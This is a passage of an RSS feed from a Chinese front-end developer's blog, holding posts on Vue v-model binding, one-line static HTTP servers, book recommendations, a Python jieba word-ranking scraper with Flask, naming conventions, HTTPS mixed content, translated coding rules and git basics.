    &amp;lt;script src=&amp;#34;https://cdn.bootcss.com/jquery/3.2.1/jquery.min.js&amp;#34;&amp;gt;&amp;lt;/script&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;

&amp;lt;div id=&amp;#34;app&amp;#34;&amp;gt;
    姓名 &amp;lt;input type=&amp;#34;text&amp;#34; v-model=&amp;#34;userName&amp;#34;&amp;gt; &amp;lt;br/&amp;gt;
    年龄 &amp;lt;input type=&amp;#34;text&amp;#34; id=&amp;#34;userAge&amp;#34; v-model=&amp;#34;userAge&amp;#34;&amp;gt; &amp;lt;br/&amp;gt;
&amp;lt;/div&amp;gt;


&amp;lt;script type=&amp;#34;text/javascript&amp;#34;&amp;gt;

new Vue({
    el: &amp;#39;#app&amp;#39;,
    data: {
        userName: &amp;#39;&amp;#39;,
        userAge: 12
    }
});

$(&amp;#39;#userAge&amp;#39;).val(14);

&amp;lt;/script&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;在页面刚打开时：姓名输入框是空的，年龄输入框是14。但是一旦你在姓名输入框输入任何字符时，年龄输入框的值就会变成12。&lt;/p&gt;
&lt;p&gt;如果你仔细看过&lt;a href=&#34;https://cn.vuejs.org/v2/guide/forms.html&#34;&gt;Vue官方文档&lt;/a&gt;，你会很容易定位问题所在。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;v-model 会忽略所有表单元素的 value、checked、selected 特性的初始值。因为它会选择 Vue 实例数据来作为具体的值。你应该通过 JavaScript 在组件的 data 选项中声明初始值。---Vue官方文档
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;你可以用 v-model 指令在表单控件元素上创建双向数据绑定。它会根据控件类型自动选取正确的方法来更新元素。尽管有些神奇，但 &lt;code&gt;v-model 本质上不过是语法糖，它负责监听用户的输入事件以更新数据&lt;/code&gt;，并特别处理一些极端的例子。&lt;/p&gt;</description>
    </item>
    <item>
      <title>一行命令搭建简易静态文件http服务器</title>
      <link>https://wdd.js.org/posts/2019/10/hvqggd/</link>
      <pubDate>Tue, 15 Oct 2019 22:21:02 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2019/10/hvqggd/</guid>
      <description>&lt;p&gt;简易服务器：在命令执行的所在路径启动一个http服务器，然后你可以通过浏览器访问该路径下的所有文件。&lt;/p&gt;
&lt;p&gt;在局域网内传文件，或者自己测试使用都是非常方便的。&lt;/p&gt;
&lt;h1 id=&#34;1-基于python&#34;&gt;1. 基于python&lt;/h1&gt;
&lt;h2 id=&#34;11-基于python2&#34;&gt;1.1. 基于Python2&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;python -m SimpleHTTPServer port&lt;/code&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;gt; python -m SimpleHTTPServer 8099
Serving HTTP on 0.0.0.0 port 8099 ...
127.0.0.1 - - [24/Oct/2017 11:07:56] &amp;#34;GET / HTTP/1.1&amp;#34; 200 -
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;12-基于python3&#34;&gt;1.2. 基于python3&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;python3 -m http.server port&lt;/code&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;gt; python3 -m http.server 8099
Serving HTTP on 0.0.0.0 port 8099 (http://0.0.0.0:8099/) ...
127.0.0.1 - - [24/Oct/2017 11:05:06] &amp;#34;GET / HTTP/1.1&amp;#34; 200 -
127.0.0.1 - - [24/Oct/2017 11:05:06] code 404, message File not found
127.0.0.1 - - [24/Oct/2017 11:05:06] &amp;#34;GET /favicon.ico HTTP/1.1&amp;#34; 404 -
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;2-基于nodejs&#34;&gt;2. 基于nodejs&lt;/h1&gt;
&lt;p&gt;首先你要安装nodejs&lt;!-- raw HTML omitted --&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>Gitbook好书推荐</title>
      <link>https://wdd.js.org/fe/gitbook-good-book/</link>
      <pubDate>Tue, 15 Oct 2019 22:01:00 +0800</pubDate>
      <guid>https://wdd.js.org/fe/gitbook-good-book/</guid>
      <description>&lt;h1 id=&#34;1-front-end-developer-handbook-2017&#34;&gt;1. Front-End Developer Handbook 2017&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;地址：&lt;a href=&#34;https://frontendmasters.com/books/front-end-handbook/2017/&#34;&gt;https://frontendmasters.com/books/front-end-handbook/2017/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这是任何人都可以用来了解前端开发实践的指南。它大致概述并讨论了前端工程的实践：如何学习它，以及在2017年实践时使用什么工具。&lt;/p&gt;
&lt;p&gt;这是专门为潜在的和目前实践的前端开发人员提供专业资源，以配备学习材料和开发工具。其次，管理者，首席技术官，导师和猎头人士可以使用它来了解前端开发的实践。&lt;/p&gt;
&lt;p&gt;手册的内容有利于网络技术（HTML，CSS，DOM和JavaScript）以及直接构建在这些开放技术之上的解决方案。本书中引用和讨论的材料是课堂上最好的或目前提出的问题。&lt;/p&gt;
&lt;p&gt;该书不应被视为对前端开发人员可用的所有资源的全面概述。这本书的价值被简单，集中和及时地组织起来，仅仅是足够的绝对信息，以免任何人在任何一个特定的主题上压倒一切。&lt;/p&gt;
&lt;p&gt;目的是每年发布一次内容更新。&lt;/p&gt;
&lt;p&gt;手册分为三部分。&lt;/p&gt;
&lt;p&gt;第一部分。前端实践&lt;/p&gt;
&lt;p&gt;第一部分广泛描述了前端工程的实践。&lt;/p&gt;
&lt;p&gt;第二部分：学习前端发展&lt;/p&gt;
&lt;p&gt;第二部分指出了自主导向和直接的资源，用于学习成为前端开发人员。&lt;/p&gt;
&lt;p&gt;第三部分：前端开发工具&lt;/p&gt;
&lt;p&gt;第三部分简要解释和识别交易工具。&lt;/p&gt;
&lt;h1 id=&#34;2-js函数式编程指南&#34;&gt;2. JS函数式编程指南&lt;/h1&gt;
&lt;p&gt;英文版地址：
中文版地址：&lt;a href=&#34;https://llh911001.gitbooks.io/mostly-adequate-guide-chinese/content/&#34;&gt;https://llh911001.gitbooks.io/mostly-adequate-guide-chinese/content/&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;这本书的主题是函数范式（functional paradigm），我们将使用 JavaScript 这个世界上最流行的函数式编程语言来讲述这一主题。有人可能会觉得选择 JavaScript 并不明智，因为当前的主流观点认为它是一门命令式（imperative）的语言，并不适合用来讲函数式。但我认为，这是学习函数式编程的最好方式，因为：&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;&lt;code&gt;你很有可能在日常工作中使用它&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;这让你有机会在实际的编程过程中学以致用，而不是在空闲时间用一门深奥的函数式编程语言做一些玩具性质的项目。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;你不必从头学起就能开始编写程序&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;在纯函数式编程语言中，你必须使用 monad 才能打印变量或者读取 DOM 节点。JavaScript 则简单得多，可以作弊走捷径，因为毕竟我们的目的是学写纯函数式代码。JavaScript 也更容易入门，因为它是一门混合范式的语言，你随时可以在感觉吃力的时候回退到原有的编程习惯上去。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;这门语言完全有能力书写高级的函数式代码&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;只需借助一到两个微型类库，JavaScript 就能模拟 Scala 或 Haskell 这类语言的全部特性。虽然面向对象编程（Object-oriented programing）主导着业界，但很明显这种范式在 JavaScript 里非常笨拙，用起来就像在高速公路上露营或者穿着橡胶套鞋跳踢踏舞一样。我们不得不到处使用 bind 以免 this 不知不觉地变了，语言里没有类可以用（目前还没有），我们还发明了各种变通方法来应对忘记调用 new 关键字后的怪异行为，私有成员只能通过闭包（closure）才能实现，等等。对大多数人来说，函数式编程看起来更加自然。+&lt;/p&gt;
&lt;p&gt;以上说明，强类型的函数式语言毫无疑问将会成为本书所示范式的最佳试验场。JavaScript 是我们学习这种范式的一种手段，将它应用于什么地方则完全取决于你自己。幸运的是，所有的接口都是数学的，因而也是普适的。最终你会发现你习惯了 swiftz、scalaz、haskell 和 purescript，以及其他各种数学偏向的语言。&lt;/p&gt;
&lt;h1 id=&#34;3-前端开发笔记本&#34;&gt;3. 前端开发笔记本&lt;/h1&gt;
&lt;p&gt;地址：&lt;a href=&#34;http://chanshuyi.github.io/frontend_notebook/&#34;&gt;http://chanshuyi.github.io/frontend_notebook/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;前端开发笔记本涵括了大部分前端开发所需的知识点，主要包括5大部分：《页面制作》、《JavaScript程序设计》、《DOM编程》、《页面架构》、《前端产品架构》。&lt;/p&gt;</description>
    </item>
    <item>
      <title>python实战 报纸分词排序</title>
      <link>https://wdd.js.org/posts/2019/10/rmsqoa/</link>
      <pubDate>Tue, 15 Oct 2019 21:59:23 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2019/10/rmsqoa/</guid>
      <description>&lt;h1 id=&#34;1-环境&#34;&gt;1. 环境&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;win7 64位&lt;/li&gt;
&lt;li&gt;python 3.5&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;2-目标&#34;&gt;2. 目标&lt;/h1&gt;
&lt;p&gt;抓取一篇报纸，并提取出关键字，然后按照出现次数排序，用echarts在页面上显示出来。&lt;/p&gt;
&lt;h1 id=&#34;3-工具选择&#34;&gt;3. 工具选择&lt;/h1&gt;
&lt;p&gt;因为之前对nodejs的相关工具比较熟悉，在用python的时候，也想有类似的工具。所以就做了一个对比的表格。&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;功能&lt;/th&gt;
          &lt;th&gt;nodejs版&lt;/th&gt;
          &lt;th&gt;python版&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;http工具&lt;/td&gt;
          &lt;td&gt;&lt;a href=&#34;https://github.com/request/request&#34;&gt;request&lt;/a&gt;&lt;/td&gt;
          &lt;td&gt;&lt;a href=&#34;https://github.com/requests/requests&#34;&gt;requests&lt;/a&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;中文分词工具&lt;/td&gt;
          &lt;td&gt;&lt;a href=&#34;https://github.com/leizongmin/node-segment&#34;&gt;node-segment&lt;/a&gt;, &lt;a href=&#34;https://github.com/yanyiwu/nodejieba&#34;&gt;nodejieba&lt;/a&gt;(一直没有安装成功过)&lt;/td&gt;
          &lt;td&gt;&lt;a href=&#34;https://github.com/fxsjy/jieba&#34;&gt;jieba&lt;/a&gt;(分词准确度比node-segment好)&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;DOM解析工具&lt;/td&gt;
          &lt;td&gt;&lt;a href=&#34;https://github.com/cheeriojs/cheerio&#34;&gt;cheeio&lt;/a&gt;&lt;/td&gt;
          &lt;td&gt;&lt;a href=&#34;https://github.com/gawel/pyquery&#34;&gt;pyquery&lt;/a&gt;(这两个工具都是有类似jQuery那种选择DOM的接口，很方便)&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;函数编程工具&lt;/td&gt;
          &lt;td&gt;&lt;a href=&#34;https://github.com/jashkenas/underscore&#34;&gt;underscore.js&lt;/a&gt;&lt;/td&gt;
          &lt;td&gt;&lt;a href=&#34;https://github.com/serkanyersen/underscore.py&#34;&gt;underscore.py&lt;/a&gt;(underscore来处理集合比较方便)&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;服务器&lt;/td&gt;
          &lt;td&gt;&lt;a href=&#34;https://github.com/expressjs/express&#34;&gt;express&lt;/a&gt;&lt;/td&gt;
          &lt;td&gt;&lt;a href=&#34;https://github.com/pallets/flask&#34;&gt;flask&lt;/a&gt;&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;4-开始的噩梦中文乱码&#34;&gt;4. 开始的噩梦：中文乱码&lt;/h1&gt;
&lt;p&gt;感觉每个学python的人都遇到过中文乱码的问题。我也不例外。&lt;/p&gt;
&lt;p&gt;首先要抓取网页，但是网页在控制台输出的时候，中文总是乱码。搞了好久，搞得我差点要放弃python。最终找到解决方法。&lt;a href=&#34;http://blog.csdn.net/jim7424994/article/details/22675759&#34;&gt; 解决python3 UnicodeEncodeError: &amp;lsquo;gbk&amp;rsquo; codec can&amp;rsquo;t encode character &amp;lsquo;\xXX&amp;rsquo; in position XX&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;过程很艰辛，但是从中也学到很多知识。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;import io
import sys
sys.stdout = io.TextIOWrapper(sys.stoodout.buffer,encoding=&amp;#39;gb18030&amp;#39;)
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;5-函数式编程-顺享丝滑&#34;&gt;5. 函数式编程： 顺享丝滑&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;#filename word_rank.py
import requests
import io
import re
import sys
import jieba as _jieba # 中文分词比较优秀的一个库
from pyquery import PyQuery as pq #类似于jquery、cheerio的库
from underscore import _ # underscore.js python版本
sys.stdout = io.TextIOWrapper(sys.stdout.buffer,encoding=&amp;#39;gb18030&amp;#39;) # 解决控制台中文乱码

USELESSWORDS = [&amp;#39;的&amp;#39;,&amp;#39;要&amp;#39;,&amp;#39;了&amp;#39;,&amp;#39;在&amp;#39;,&amp;#39;和&amp;#39;,&amp;#39;是&amp;#39;,&amp;#39;把&amp;#39;,&amp;#39;向&amp;#39;,&amp;#39;上&amp;#39;,&amp;#39;为&amp;#39;,&amp;#39;等&amp;#39;,&amp;#39;个&amp;#39;] # 标记一些无用的单词
TOP = 30 # 只要前面的30个就可以了

def _remove_punctuation(line): # 移除非中文字符
    # rule = re.compile(&amp;#34;[^a-zA-Z0-9\u4e00-\u9fa5]&amp;#34;)
    rule = re.compile(&amp;#34;[^\u4e00-\u9fa5]&amp;#34;)
    line = rule.sub(&amp;#39;&amp;#39;,line)
    return line

def _calculate_frequency(words): # 计算分词出现的次数
    result = {}
    res = []

    for word in words:
        if result.get(word, -1) == -1:
            result[word] = 1
        else:
            result[word] += 1

    for word in result:
        if _.contains(USELESSWORDS, word): # 排除无用的分词
            continue

        res.append({
                &amp;#39;word&amp;#39;: word,
                &amp;#39;fre&amp;#39;: result[word]
            })

    return _.sortBy(res, &amp;#39;fre&amp;#39;)[::-1][:TOP] # 降序排列

def _get_page(url): # 获取页面
    return requests.get(url)

def _get_text(req): # 获取文章部分
    return pq(req.content)(&amp;#39;#ozoom&amp;#39;).text()

def main(url): # 入口函数，函数组合
    return _.compose(
        _get_page,
        _get_text,
        _remove_punctuation,
        _jieba.cut,
        _calculate_frequency
        )(url)
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;6-python服务端flask浅入浅出&#34;&gt;6. python服务端：Flask浅入浅出&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;import word_rank
from flask import Flask, request, jsonify, render_template
app = Flask(__name__)
app.debug = True

@app.route(&amp;#39;/rank&amp;#39;) # 从query参数里获取pageUrl，并给分词排序
def getRank():
    pageUrl = request.args.get(&amp;#39;pageUrl&amp;#39;)
    app.logger.debug(pageUrl)

    rank = word_rank.main(pageUrl)
    app.logger.debug(rank)
    return jsonify(rank)

@app.route(&amp;#39;/&amp;#39;) # 主页面
def getHome():
    return render_template(&amp;#39;home.html&amp;#39;)

if __name__ == &amp;#39;__main__&amp;#39;:
    app.run()
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;7-总结&#34;&gt;7. 总结&lt;/h1&gt;
&lt;p&gt;据说有个定律：&lt;code&gt;凡是能用JavaScript写出来的，最终都会用JavaScript写出来&lt;/code&gt;。 我是很希望这样啦。但是不得不承认，python上有很多非常优秀的库。&lt;!-- raw HTML omitted --&gt;这些库在npm上并没有找到合适的替代品。&lt;/p&gt;</description>
    </item>
    <item>
      <title>代码整洁之道 - 有意义的命名</title>
      <link>https://wdd.js.org/posts/2019/10/ouvbom/</link>
      <pubDate>Tue, 15 Oct 2019 21:58:30 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2019/10/ouvbom/</guid>
      <description>&lt;p&gt;在小朱元璋出生一个月后，父母为他取了一个名字（元时惯例）：朱重八，这个名字也可以叫做朱八八。我们这里再介绍一下，朱重八家族的名字，都很有特点。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;朱重八高祖名字：朱百六；
朱重八曾祖名字：朱四九；
朱重八祖父名字：朱初一；
他的父亲我们介绍过了，叫朱五四。
取这样的名字不是因为朱家是搞数学的，而是因为在元朝，老百姓如果不能上学和当官就没有名字，只能以父母年龄相加或者出生的日期命名。（登记户口的人一定会眼花）&amp;ndash;《明朝那些事儿》&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;那么问题来了，朱四九和朱百六是什么关系？ 你可能马上懵逼了。所以说：&lt;code&gt;命名不仅仅是一种科学，更是一种艺术&lt;/code&gt;。&lt;/p&gt;
&lt;h1 id=&#34;1-名副其实&#34;&gt;1. 名副其实&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;// bad
var d; // 分手的时间，以天计算

// good
var daysAfterBrokeUp; // 分手以后，以天计算
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;2-避免误导&#34;&gt;2. 避免误导&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;// bad
var nameList = &amp;#39;wdd&amp;#39;; // List一般暗指数据是数组，而不应该赋值给字符串

// good
var nameList = [&amp;#39;wdd&amp;#39;,&amp;#39;ddw&amp;#39;,&amp;#39;dwd&amp;#39;]; // 

// bad
var ill10o = 10; //千万不要把i,1,l,0,o,O放在一起，傻傻分不清楚

// good
var illOne = 10;
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;3-做有意义的区分&#34;&gt;3. 做有意义的区分&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;// bad
var userData, userInfo; // Data和Info, 有什么区别？？？？, 不要再用data和info这样模糊不清的单词了

// good
var userProfile, userAcount
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;4-使用读得出来的名称&#34;&gt;4. 使用读得出来的名称&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;// bad 
var beeceearrthrtee; // 你知道怎么读吗？ 鼻涕阿三？？

// good
var userName;
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;5-使用可搜索的名称&#34;&gt;5. 使用可搜索的名称&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;// bad
var e = &amp;#39;not found&amp;#39;; // 想搜e, 就很难搜

// good
var ERROR_NO_FOUND = &amp;#39;not found&amp;#39;;
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;6-方法名一概是动词短语&#34;&gt;6. 方法名一概是动词短语&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;// good
function createAgent(){}
funtion deleteAgent(){}
function updateAgent(){}
function queryAgent(){}
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;7-尽量不要用单字母名称-除了用于循环&#34;&gt;7. 尽量不要用单字母名称, 除了用于循环&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;// bad
var i = 1;

// good
for(var i=0; i&amp;lt;10; i++){
    ...
}

// very good
userList.forEach(function(user){
    ...
});
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;8-每个概念对应一个词&#34;&gt;8. 每个概念对应一个词&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;controller和manager, 没什么区别，要用controller都用controller, 要用manager都用manager, 不要混着用
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;9-建立项目词汇表-不要随意创造名称&#34;&gt;9. 建立项目词汇表, 不要随意创造名称&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;user, agent, org, queue, activity, device...
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;10-参考资料&#34;&gt;10. 参考资料&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;《代码整洁之道》&lt;/li&gt;
&lt;li&gt;《明朝那些事儿》&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>可能被遗漏的https与http的知识点</title>
      <link>https://wdd.js.org/network/of5hny/</link>
      <pubDate>Tue, 15 Oct 2019 21:56:42 +0800</pubDate>
      <guid>https://wdd.js.org/network/of5hny/</guid>
      <description>&lt;h1 id=&#34;1-https域向http域发送请求会被浏览器直接拒绝http向https则不会&#34;&gt;1. HTTPS域向HTTP域发送请求会被浏览器直接拒绝，HTTP向HTTPS则不会&lt;/h1&gt;
&lt;p&gt;例如在github pages页面，这是一个https页面，如果在这个页面向http发送请求，那么会直接被浏览器拒绝，并在控制台输出下面的报错信息。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;jquery-1.11.3.min.js:5 Mixed Content: The page at &amp;#39;https://wangduanduan.github.io/ddddddd/&amp;#39; was loaded over HTTPS, but requested an insecure XMLHttpRequest endpoint &amp;#39;http://cccccc/&amp;#39;. This request has been blocked; the content must be served over HTTPS.
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;如果你在做第三方集成的系统，如果他们是在浏览器中直接调用你提供的接口，&lt;code&gt;那么最好你使用https协议，这样无论对方是https还是http都可以访问&lt;/code&gt;。（相信我，这个很重要，我曾经经历过上线后遇到这个问题，然后连夜申请证书，把http升级到https的痛苦经历）&lt;/p&gt;
&lt;h1 id=&#34;2-https的默认端口是443而不是443&#34;&gt;2. HTTPS的默认端口是443，而不是443&lt;/h1&gt;
&lt;p&gt;如果443端口已经被其他服务占用了，那么使用其他任何没有被占用的端口都可以用作HTTPS服务，只不过在请求的时候需要加上端口号罢了。&lt;/p&gt;</description>
    </item>
    <item>
      <title>【译】13简单的优秀编码规则（从我15年的经验）</title>
      <link>https://wdd.js.org/posts/2019/10/corgz1/</link>
      <pubDate>Tue, 15 Oct 2019 21:54:25 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2019/10/corgz1/</guid>
      <description>&lt;p&gt;原文地址：&lt;a href=&#34;https://hackernoon.com/few-simple-rules-for-good-coding-my-15-years-experience-96cb29d4acd9#.ddzpjb80c&#34;&gt;https://hackernoon.com/few-simple-rules-for-good-coding-my-15-years-experience-96cb29d4acd9#.ddzpjb80c&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;嗨，我的工作作为一个程序员超过15年，并使用许多不同的语言，范例，框架和其他狗屎。我想和大家分享我写好代码的规则。&lt;/p&gt;
&lt;h1 id=&#34;1-优化vs可读性-去他妈的优化&#34;&gt;1. 优化VS可读性 去他妈的优化&lt;/h1&gt;
&lt;p&gt;始终编写易于阅读且对开发人员可理解的代码。因为在硬可读代码上花费的时间和资源将远远高于从优化中获得的。&lt;!-- raw HTML omitted --&gt;如果你需要进行优化，那么使它像DI的独立模块，具有100％的测试覆盖率，并且不会被触及至少一年。&lt;/p&gt;
&lt;h1 id=&#34;2-架构第一&#34;&gt;2. 架构第一&lt;/h1&gt;
&lt;p&gt;我看到很多人说“我们需要快速做事，我们没有时间做架构”。其中约99％的人因为这样的想法而遇到了大问题。&lt;!-- raw HTML omitted --&gt;编写代码而不考虑其架构是没有用的，就像没有实现它们的计划一样，梦想你的愿望。&lt;!-- raw HTML omitted --&gt;在编写代码的第一行之前，你应该明白它将要做什么，它将如何使用，模块，服务如何相互工作，它将有什么结构，如何进行测试和调试，以及如何更新。&lt;/p&gt;
&lt;h1 id=&#34;3-测试覆盖率&#34;&gt;3. 测试覆盖率&lt;/h1&gt;
&lt;p&gt;测试是好事，但他们并不总是负担得起，对项目有意义。&lt;/p&gt;
&lt;p&gt;当你需要测试：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;当你编写模块时，微服务将不会被触及至少一个月。&lt;/li&gt;
&lt;li&gt;当你编写开源代码。&lt;/li&gt;
&lt;li&gt;当你编写涉及金融渠道的核心代码或代码。&lt;/li&gt;
&lt;li&gt;当您有代码更新的同时更新测试的资源。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;当你不需要测试时：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;当你是一个创业。&lt;/li&gt;
&lt;li&gt;当你有小团队和代码更改是快速。&lt;/li&gt;
&lt;li&gt;当你编写的脚本，可以简单地通过他们的输出手动测试。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;记住，&lt;code&gt;带有严格测试的代码可能比没有测试的代码更有害&lt;/code&gt;。&lt;/p&gt;
&lt;h1 id=&#34;4-保持简单极度简单&#34;&gt;4. 保持简单，极度简单&lt;/h1&gt;
&lt;p&gt;不要编写复杂的代码。更多更简单，那么更少的错误它可能有和更少的时间来调试它们。代码应该做的只是它需要没有非常多的抽象和其他OOP shit（尤其是涉及java开发人员）+ 20％的东西可能需要在将来以简单的方式更新它。&lt;/p&gt;
&lt;h1 id=&#34;5-注释&#34;&gt;5. 注释&lt;/h1&gt;
&lt;p&gt;出现注释说明你的代码不够好。好的代码应该是可以理解的，没有一行注释。但是如何为新开发人员节省时间？ - 编写简单的内联文档描述什么和如何方法工作。这将节省很多时间来理解，甚至更多 - 它将给人们更多的机会来提出更好的实施这种方法。并且它将是全球代码文档的良好开端。&lt;/p&gt;
&lt;h1 id=&#34;6-硬耦合vs较小耦合&#34;&gt;6. 硬耦合VS较小耦合&lt;/h1&gt;
&lt;p&gt;始终尝试使用微服务架构。单片软件可以比微服务软件运行得更快，但只能在一个服务器的上下文中运行。&lt;!-- raw HTML omitted --&gt;微服务使您可以不仅在许多服务器上，而且有时甚至在一台机器上（我的意思是过程分发）高效地分发您的软件。&lt;/p&gt;
&lt;h1 id=&#34;7-代码审查&#34;&gt;7. 代码审查&lt;/h1&gt;
&lt;p&gt;代码审查可以是好的，也以是坏的。&lt;!-- raw HTML omitted --&gt;您可以组织代码审查，只有当您有开发人员了解95％的代码，谁可以监控所有更新，而不浪费很多时间。在其他情况下，这将是只是耗时，每个人都会讨厌这个。&lt;/p&gt;
&lt;p&gt;在这部分有很多问题，所以更深入地描述这一点。&lt;/p&gt;
&lt;p&gt;许多人认为代码审查是一个很好的方式教新手，或者工作在不同部分的代码的队友。但是代码审查的主要目标是保持代码质量，而不是教学。让我们想象你的团队制作代码用于控制核反应堆或太空火箭发动机的冷却系统。你在非常硬的逻辑中犯了巨大的错误，然后你给这个代码审查新的家伙。你怎么认为会发生意外的风险？ - 我的练习率超过70％。&lt;/p&gt;
&lt;p&gt;良好的团队是每个人都有自己的角色，负责确切的工作。如果有人想要理解另一段代码，那么他去一个负责任去问他。你不可能知道一切，更好的优秀的理解小块代码而不是理解所有。&lt;/p&gt;
&lt;h1 id=&#34;8-重构没啥用&#34;&gt;8. 重构没啥用&lt;/h1&gt;
&lt;p&gt;在我的职业生涯中，我听到很多次“不要担心，我们以后会重构它”。在未来，这会导致大的技术债务或从头开始删除所有的代码和写作。&lt;/p&gt;
&lt;p&gt;所以，不要得到一个债务，除非你有钱从头开发你的软件几次。&lt;/p&gt;
&lt;h1 id=&#34;9-当你累了或在一个坏的心情不要写代码&#34;&gt;9. 当你累了或在一个坏的心情不要写代码。&lt;/h1&gt;
&lt;p&gt;当开发人员厌倦时，他们正在制造2到5倍或者更多的bug。所以工作更多是非常糟糕的做法。这就是为什么越来越多的国家思考6小时工作日，其中一些已经有了。精神工作不同于使用你的二头肌。&lt;/p&gt;</description>
    </item>
    <item>
      <title>gitbash生存指南 之 git常用命令与oh-my-zsh常用缩写</title>
      <link>https://wdd.js.org/posts/2019/10/gmb0oi/</link>
      <pubDate>Tue, 15 Oct 2019 21:48:37 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2019/10/gmb0oi/</guid>
      <description>&lt;p&gt;&lt;code&gt;如果命令行可以解决的问题，就绝对不要用GUI工具。快点试用Git bash吧， 别再用TortoiseGit了。&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;1-必会8个命令&#34;&gt;1. 必会8个命令&lt;/h1&gt;
&lt;p&gt;下面的操作都是经常使用的，有些只需要做一次，有些是经常操作的&lt;/p&gt;
&lt;p&gt;git命令虽然多，但是经常使用的不超过8个。&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;命令&lt;/th&gt;
          &lt;th&gt;执行次数&lt;/th&gt;
          &lt;th&gt;说明&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;git clone http://sdfjslf.git&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;每个项目只需要执行一次&lt;/td&gt;
          &lt;td&gt;//克隆一个项目&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;git fetch origin round-2&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;每个分支只需要执行一次&lt;/td&gt;
          &lt;td&gt;//round-2分支在本地不存在，首先要创建一个分支&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
